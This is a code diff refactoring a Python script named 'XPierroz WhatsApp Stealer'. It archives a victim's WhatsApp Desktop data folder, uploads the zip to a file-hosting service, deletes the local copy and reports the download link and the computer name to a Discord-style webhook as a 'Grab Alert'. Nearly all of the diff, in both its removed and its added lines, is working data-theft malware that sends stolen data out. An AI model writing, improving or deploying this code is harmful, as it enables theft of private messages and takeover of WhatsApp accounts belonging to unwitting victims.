@@ -1,17 +1,13 @@
-import dhooks 
-import os
-import requests
-import time
-import socket
-import shutil
+import os, requests, time, socket, shutil
 
 # PSG > OM
 
 WEBHOOK = "xpierroz on top"
-direct = f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
-print(direct)
 
-def uploadToGofile(path):
+temp = os.environ.get('TMP') or os.environ.get('TEMP')
+direct = f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
+
+def upload(path):
     for x in range(10):
         try:
             rr = requests.post(
@@ -25,27 +21,32 @@ def uploadToGofile(path):
             time.sleep(2)
     return False
 
-try:
-    shutil.make_archive("ssouput", "zip", direct)
-except Exception: 
-    pass
+def l_om_est_eclate():
+    try:
+        shutil.make_archive(os.path.join(temp, "ssouput"), "zip", direct)
+    except Exception:
+        pass
+    
+    m = upload(f"{temp}\\ssouput.zip")
+    os.remove(f"{temp}\\ssouput.zip")
+    
+    embed = {
+        "title": "**XPierroz WhatsApp Stealer Report**",
+        "description": f"🖥️ Pc Name: {socket.gethostname()}\n📎 Url: {m}",
+        "color": 0x008000
+    }
+    
+    payload = {
+        "content": "🔔 Grab Alert ||@everyone||",
+        "username": "XPierroz WhatsApp Stealer",
+        "avatar_url": "https://github.com/xpierroz/WhatsappStealer/blob/master/assets/whatsapp.png?raw=true",
+        "embeds": [embed]
+    }
 
-m = uploadToGofile(f"{os.getcwd()}\\ssouput.zip")
-os.remove(f"{os.getcwd()}\\ssouput.zip")
+    headers = {
+        "Content-Type": "application/json"
+    }
+    
+    requests.post(WEBHOOK, json=payload, headers=headers)
 
-message = f"**XPierroz WhatsApp Stealer Report**\n\n"
-message += f"📌 Pc: {socket.gethostname()}\n"
-message += f"🔍 Url: {m}"
-
-embed = dhooks.Embed(
-    title="🔔 Grab Alert",
-    description=message,
-    color=0xFF5733
-)
-
-webhook = dhooks.Webhook(
-    url=WEBHOOK,
-    username="XPierroz WhatsApp Stealer",
-    avatar_url="https://github.com/xpierroz/WhatsappStealer/blob/master/assets/whatsapp.png?raw=true"
-)
-webhook.send(embed=embed)
+l_om_est_eclate()
